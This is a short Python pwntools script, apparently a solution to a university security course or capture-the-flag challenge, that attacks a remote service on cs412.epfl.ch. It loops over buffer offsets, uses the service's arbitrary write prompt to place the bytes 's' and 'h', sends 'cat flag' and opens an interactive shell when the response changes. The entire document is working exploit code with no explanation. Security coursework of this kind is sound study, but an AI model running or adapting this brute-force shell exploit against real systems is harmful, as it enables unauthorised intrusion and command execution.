from pwn import *

for offset in range(32, 4096, 8):
    print(f"Trying offset: {offset}")

    p = remote("cs412.epfl.ch", 9005)

    p.sendlineafter(b"Which position do you want to write into the buffer, and what do you want to write? ", f"{offset} s".encode())

    p.sendlineafter(b"Which position do you want to write into the buffer, and what do you want to write? ", f"{offset + 1} h".encode())

    p.sendline(b"cat flag")
    response = p.recvline(timeout=2)
    print("Response:", response)
    if response and b"flag\n" not in response:
        print("Success! Getting shell...")
        p.interactive()
        break
    else:
        print("Failed, trying next offset...")
        p.close()